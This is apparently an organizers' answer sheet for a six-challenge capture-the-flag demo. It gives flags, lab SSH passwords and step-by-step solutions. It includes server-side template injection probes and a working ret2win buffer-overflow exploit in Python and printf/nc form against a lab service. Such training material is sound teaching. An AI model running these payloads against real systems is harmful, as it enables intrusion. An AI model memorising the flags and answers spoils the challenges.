# STARS 2nd demo answer sheet

Made by Axel Jonas C. Tangalin.

**Organizers only.** None of these challenges are in a real event, so it's fine to walk through these solutions in front of players during a demo.

The 2nd demo is a step up from the first: one ★★ Medium per category, each worth 60 points, for a maximum of 360. Each description names the idea behind the challenge and the tools for it, and the hints walk through the rest. Points don't drop, there's no mission clock, and every hint is free, so anyone can follow along. (In the first demo hints cost points, and CTFd won't sell a hint to a team on 0 points, so a Demo Team stuck on its first challenge here could never buy one.)

Nobody needs to log in: everyone who opens the demo plays as `demo1` on the **Demo Team**, so a solve by one person shows as solved for everyone. The admin login is in `LOGINS.txt` in this folder.

The 3-wrong-flags limit is shared too. To unlock a challenge, delete one of the Demo Team's wrong submissions for it in **Admin Panel > Submissions**, then wait a minute. To clear everything between showings, use **Admin Panel > Config > Reset** and reset submissions only.

The 2nd demo's CTFd is at `http://192.168.8.109:8500`.

The commands use `192.168.8.109`. If your IP has changed, use the new one.

| Challenge | Category | Where | Flag |
|---|---|---|---|
| Calvera | Ursa Minor (Linux) | `ssh calvera@192.168.8.109 -p 2250`, password `neutronstar` | `STARS{c4lv3r4_tru5ts_n0_p4th}` |
| Flame Nebula | Orion (Web) | `http://192.168.8.109:8501` | `STARS{fl4m3_t3mpl4t3s_sp1ll_s3cr3ts}` |
| Jellyfish | Gemini (Crypto) | downloads: `signals.txt`, `newsletter.txt` | `STARS{tw1n_k3ys_c4nc3l_0ut}` |
| Lyrids | Lyra (Forensics) | download: `call.wav` | `STARS{lyr1ds_d14l_t0n3s}` |
| Fafnir | Draco (Reversing) | `ssh fafnir@192.168.8.109 -p 2252`, password `draco` | `STARS{f4fn1r_4nsw3rs_t0_h1s_tru3_n4m3}` |
| Jabbah | Scorpius (Pwn) | `nc 192.168.8.109 9051`, download `jabbah.c` | `STARS{j4bb4h_r3turns_t0_th3_c0r3}` |

Every walkthrough below was played as a visitor on 2026-11-24, over real SSH sessions, and the outputs are the ones it got.

## Calvera (Ursa Minor, Linux)

**Teaches:** `PATH`, and how to tell which program a command really runs.

Some commands on this account are fakes. `~/.local/bin` comes first in the account's `PATH`, and it holds look-alike `cat`, `grep`, `head`, `tail`, `less` and others. They run the real program, then replace anything shaped like a flag with `[hidden]`.

1. Log in: `ssh calvera@192.168.8.109 -p 2250`, password `neutronstar`.
2. `ls -a` shows `.bash_profile  .bashrc  .local  report.txt`.
3. `cat report.txt` shows the report, with `Catalogue entry: [hidden]`. `grep`, `head` and `less` do the same.
4. `type cat` prints `cat is hashed (/home/calvera/.local/bin/cat)` (or `cat is /home/calvera/.local/bin/cat` if you haven't run `cat` yet), not `/usr/bin/cat`. That's the fake.
5. `echo $PATH` shows why: `/home/calvera/.local/bin` is first in the list.
6. `/usr/bin/cat report.txt` runs the real `cat`, and the line reads `Catalogue entry: STARS{c4lv3r4_tru5ts_n0_p4th}`.

Worth showing: `/usr/bin/cat report.txt | grep Catalogue` still hides it, because the `grep` in that pipe is the fake one. Every command in a pipe needs its full path. Other ways that work: `PATH=/usr/bin cat report.txt`, or `cat .local/bin/cat` to read how the fake works.

## Flame Nebula (Orion, Web)

**Teaches:** server-side template injection.

The register writes the typed star name into the source of the card's template, so anything between `{{` and `}}` runs as a template expression.

1. Open `http://192.168.8.109:8501` and name a star `Vega`. The card says "Welcome to the register, **Vega**!"
2. Name one `{{7*7}}`. The card says **49**, not `{{7*7}}`. The site is working out what you type.
3. Name one `{{config}}`. The card shows the site's settings: `{'SITE_NAME': 'Flame Nebula Star Register', 'REGISTER_OPEN': True, 'STARS_PER_VISITOR': 1, 'SECRET_KEY': 'STARS{fl4m3_t3mpl4t3s_sp1ll_s3cr3ts}'}`.

It's safe to show: the card runs in Jinja's sandbox. Things like `{{ ''.__class__ }}` answer "access to attribute '__class__' ... is unsafe", `{{ 9**9**9 }}` answers "Powers (**) are switched off on this site", and a typed `<script>` tag shows as text.

## Jellyfish (Gemini, Crypto)

**Teaches:** why a one-time key must never be used twice.

Both signals are messages XORed with the same key. XOR undoes itself, so Signal 1 XOR the published message gives the key, and the key opens Signal 2.

1. Download `signals.txt` and `newsletter.txt`. The newsletter's last line is the message that became Signal 1: `JELLYFISH STATION BULLETIN 443. ALL TWIN ARRAYS ARE ONLINE. THE NEXT SWEEP OF IC 443 STARTS AT 2200 HOURS. OVER AND OUT.`
2. In CyberChef, paste Signal 2's hex as the input.
3. Add **From Hex**.
4. Add **XOR**, set the key format to **HEX**, and paste Signal 1's hex as the key.
5. Add another **XOR**, set the key format to **UTF8**, and paste the newsletter's message as the key.
6. The output reads `Private, for the twins only: the vault phrase is STARS{tw1n_k3ys_c4nc3l_0ut}. Burn this.`

The longer way, as the hints describe: Signal 1, From Hex, XOR with the newsletter message (UTF8), then To Hex gives the key. Then Signal 2, From Hex, XOR with that key (HEX).

## Lyrids (Lyra, Forensics)

**Teaches:** DTMF, the tones a phone's keypad makes, and decimal character codes.

`call.wav` is 26 seconds of keypad tones: the flag's character codes, with `*` between them.

1. Download `call.wav` and listen: it's a phone being dialled.
2. Upload it to an online DTMF decoder (search for "DTMF decoder audio file"). It gives the keys: `83*84*65*82*83*123*108*121*114*49*100*115*95*100*49*52*108*95*116*48*110*51*115*125`.
3. In CyberChef, paste the keys, add **From Decimal**, and set its **Delimiter** to **Auto** (the default, Space, would only read the first number). It reads `STARS{lyr1ds_d14l_t0n3s}`. The longer way: **Find / Replace** with `*` in Find, that box switched from REGEX to SIMPLE STRING (as a regex, `*` alone is an error), and one space in Replace, then **From Decimal**.

Without a decoder: open the file in a spectrogram viewer (Audacity, or a website). Each beep shows as two lines, and the DTMF table on Wikipedia gives the key for each pair: 697 Hz and 1209 Hz is 1, 941 Hz and 1209 Hz is `*`, and so on. It's slow but works.

## Fafnir (Draco, Reversing)

**Teaches:** `argv[0]`: a program knows the name it was started under.

The program compares the name it was started under with its true name, which is stored as plain text inside it. The flag is XORed with the true name, so jumping past the check in gdb only prints garbage.

1. Log in: `ssh fafnir@192.168.8.109 -p 2252`, password `draco`.
2. `./fafnir` prints `You called me "fafnir". That is only the name on my door.` and `Fafnir answers to his true name, and to nothing else.`
3. `ltrace ./fafnir` shows the comparison: `strcmp("fafnir", "gnitaheath-wyrm") = -1`. The first one is the name it was started as, so the second is its true name. (`strings fafnir` lists `gnitaheath-wyrm` too, among the program's other text.)
4. Start it under that name with a link: `ln -sf ~/fafnir /tmp/gnitaheath-wyrm`, then `/tmp/gnitaheath-wyrm`. It prints `You know my true name. STARS{f4fn1r_4nsw3rs_t0_h1s_tru3_n4m3}`.

   The box's `/tmp` is shared and persists, so a plain `ln -s` fails with `File exists` on a second attempt. The `-f` overwrites the old link, so you can re-run the solve any time. (Or just run the existing `/tmp/gnitaheath-wyrm` again — the link still works.)

Another way: `(exec -a gnitaheath-wyrm ./fafnir)`. Keep the brackets, or `exec` replaces your shell and the session ends once the program finishes.

## Jabbah (Scorpius, Pwn)

**Teaches:** a return-address overwrite (ret2win). Reuses 2nd Star's Antares program, so its trick matches Antares in the real events; that's why it's a demo, not a secret.

The buffer is 64 bytes, with 8 more bytes of saved data before the return address (72 bytes in total), and `read()` takes up to 256 bytes into it. The program prints the address of `supernova()`, the function that reads the flag and is never called otherwise. Overwrite the return address with it. This needs raw bytes, so pipe them in rather than typing.

The address is `0x4017c5` as built. **Read it live** from the program's `supernova() is at 0x...` line, because it changes if `jabbah.c` is recompiled.

- **From your own computer with Python** (reads the address itself, so it survives a rebuild):
  ```python
  import socket, re, struct
  s = socket.create_connection(("192.168.8.109", 9051))
  banner = b""
  while b"reading:" not in banner:
      banner += s.recv(4096)
  addr = int(re.search(rb"supernova\(\) is at (0x[0-9a-fA-F]+)", banner).group(1), 16)
  s.sendall(b"A" * 72 + struct.pack("<Q", addr))
  print(s.recv(4096).decode(errors="replace"))
  ```
  It prints `*** CORE COLLAPSE ***` and the flag.

- **From the Calvera account** (for players without `nc`; it has no Python, so type the address with `printf`):
  ```bash
  printf 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xc5\x17\x40\x00\x00\x00\x00\x00' | nc jabbah 9001
  ```
  That's 72 `A`s, then `0x4017c5` written backwards (little-endian) in 8 bytes. Calvera's faked commands don't touch `nc`, so the flag comes back in full.
